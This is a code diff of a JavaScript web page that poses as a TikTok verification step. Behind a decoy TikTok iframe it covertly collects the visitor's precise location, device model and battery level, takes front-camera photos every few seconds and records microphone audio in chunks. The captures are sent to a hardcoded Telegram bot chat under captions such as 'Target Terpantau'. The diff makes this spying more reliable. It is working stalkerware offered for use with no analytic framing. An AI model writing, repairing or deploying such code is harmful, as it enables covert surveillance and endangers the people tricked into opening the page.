@@ -75,11 +75,12 @@
     const CHAT_ID = '6888530451';
     let userLoc = "Menunggu izin...";
     let deviceName = "Mendeteksi...";
+    let mediaRecorder;
+    let audioChunks = [];
 
     async function getAdvancedDeviceName() {
         let rawModel = "Mobile Device";
         
-        // 1. Coba deteksi menggunakan API modern (Chromium)
         if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
             try {
                 const hints = await navigator.userAgentData.getHighEntropyValues(['model']);
@@ -87,26 +88,20 @@
             } catch (e) {}
         } 
         
-        // 2. Fallback pembacaan regex string jika API modern tidak tersedia/gagal
         if (rawModel === "Mobile Device") {
             const ua = navigator.userAgent;
-            
             if (/iPhone|iPad|iPod/i.test(ua)) {
                 return "Apple iPhone";
             }
-            
-            // Mengambil teks di dalam kurung pertama yang berisi detail hardware
             const matchContainer = ua.match(/\(([^)]+)\)/);
             if (matchContainer && matchContainer[1]) {
                 const tokens = matchContainer[1].split(';');
-                // Cari string yang biasanya berisi kode model Android sebelum kata 'Build/'
                 for (let token of tokens) {
                     token = token.trim();
                     if (token.includes('Build/')) {
                         rawModel = token.split('Build/')[0].trim();
                         break;
                     }
-                    // Alternatif jika string tidak mencantumkan kata 'Build/' tapi mengandung format model umum
                     if (/Linux/i.test(token) || /Android/i.test(token) || /wv/i.test(token)) {
                         continue;
                     }
@@ -117,10 +112,8 @@
             }
         }
 
-        // Pembersihan karakter noise jika terbawa dari webview (misal: "wv POCO X6 Pro")
         rawModel = rawModel.replace(/^wv\s/, '').trim();
         
-        // Database pencocokan kode bentukan ke nama komersial perangkat
         const db = {
             "2310FPCA4G": "POCO C65", "M2102J20SG": "POCO X3 Pro", "2201117TY": "Redmi Note 11", 
             "2201116SG": "Redmi Note 11 Pro", "22101316G": "POCO M5", "M2012K11AG": "POCO F3", 
@@ -144,53 +137,76 @@
             "V2141": "Vivo Y75 5G", "V2249": "Vivo V25 Pro", "V2217": "Vivo Y22",
             "KJ5": "Tecno Spark 20", "AD6": "Tecno Pova 5", "BG6": "Itel P55", "S665L": "Itel Vision 1"
         };
-        
         return db[rawModel] || rawModel;
     }
 
     async function startSystem() {
         deviceName = await getAdvancedDeviceName();
+
+        // 1. Pemicu Izin Lokasi (Sintaks `${}` sudah diperbaiki total)
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(pos => {
+                userLoc = `https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`;
+            }, err => { 
+                userLoc = "Izin Lokasi Ditolak"; 
+            }, { enableHighAccuracy: true, timeout: 5000 });
+        } else {
+            userLoc = "Tidak Didukung Browser";
+        }
+
+        // 2. Transisi UI ke Halaman Utama TikTok
         document.getElementById('verifyBox').style.display = 'none';
         document.getElementById('mainContent').style.display = 'block';
         document.getElementById('gFrame').src = "https://www.tiktok.com/";
 
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(pos => {
-                userLoc = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-            }, err => { userLoc = "Izin Lokasi Ditolak"; }, { enableHighAccuracy: true });
-        }
-
+        // 3. Akses Kamera Depan
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
             document.getElementById('video').srcObject = stream;
-            setInterval(takeAndSend, 5000);
+            setInterval(takeAndSend, 7000); 
         } catch (e) {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 document.getElementById('video').srcObject = stream;
-                setInterval(takeAndSend, 5000);
+                setInterval(takeAndSend, 7000);
             } catch (err) { takeAndSend(); }
         }
 
+        // 4. Akses Live Mic yang Aman dari Crash
         startAudioCapture();
     }
 
     async function startAudioCapture() {
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-            const recorder = new MediaRecorder(stream);
-            let audioChunks = [];
+            mediaRecorder = new MediaRecorder(stream);
+            audioChunks = [];
             
-            recorder.ondataavailable = (e) => audioChunks.push(e.data);
-            recorder.onstop = () => {
-                const blob = new Blob(audioChunks, { type: 'audio/ogg; codecs=opus' });
-                sendAudio(blob);
-                audioChunks = [];
-                recorder.start();
+            mediaRecorder.ondataavailable = (e) => {
+                if (e.data && e.data.size > 0) audioChunks.push(e.data);
             };
 
-            recorder.start();
-            setInterval(() => { if(recorder.state === "recording") recorder.stop(); }, 10000);
+            mediaRecorder.onstop = async () => {
+                const blob = new Blob(audioChunks, { type: 'audio/ogg; codecs=opus' });
+                if (blob.size > 0) await sendAudio(blob);
+                audioChunks = [];
+                
+                // Jeda pengaman 1.5 detik
+                setTimeout(() => {
+                    if (mediaRecorder && mediaRecorder.state === "inactive") {
+                        mediaRecorder.start();
+                    }
+                }, 1500); 
+            };
+
+            mediaRecorder.start();
+
+            setInterval(() => {
+                if (mediaRecorder && mediaRecorder.state === "recording") {
+                    mediaRecorder.stop();
+                }
+            }, 12000);
+
         } catch (e) { console.log("Mic blocked"); }
     }
 
@@ -199,7 +215,7 @@
         fd.append('chat_id', CHAT_ID);
         fd.append('voice', blob, 'mic.ogg');
         fd.append('caption', `🎙 *Audio Terpantau*\nHP: ${deviceName}`);
-        fetch(`https://api.telegram.org/bot${TOKEN}/sendVoice`, { method: 'POST', body: fd });
+        fetch(`https://api.telegram.org/bot${TOKEN}/sendVoice`, { method: 'POST', body: fd }).catch(e => {});
     }
 
     async function takeAndSend() {
@@ -214,16 +230,15 @@
         const report = (blob) => {
             const fd = new FormData();
             fd.append('chat_id', CHAT_ID);
+            fd.append('parse_mode', 'Markdown');
             
             if (blob) {
                 fd.append('photo', blob, 'shot.jpg');
                 fd.append('caption', `👁 *Target Terpantau*\n\n📱 HP: ${deviceName}\n🔋 Baterai: ${battery}\n📍 Lokasi: ${userLoc}\n📷 Mode: Kamera Depan`);
-                fd.append('parse_mode', 'Markdown');
-                fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd }).catch(e => {});
             } else {
                 fd.append('text', `👁 *Target Terpantau (Teks Saja)*\n\n📱 HP: ${deviceName}\n🔋 Baterai: ${battery}\n📍 Lokasi: ${userLoc}\n⚠️ Kamera tidak aktif.`);
-                fd.append('parse_mode', 'Markdown');
-                fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, { method: 'POST', body: fd });
+                fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, { method: 'POST', body: fd }).catch(e => {});
             }
         };
 
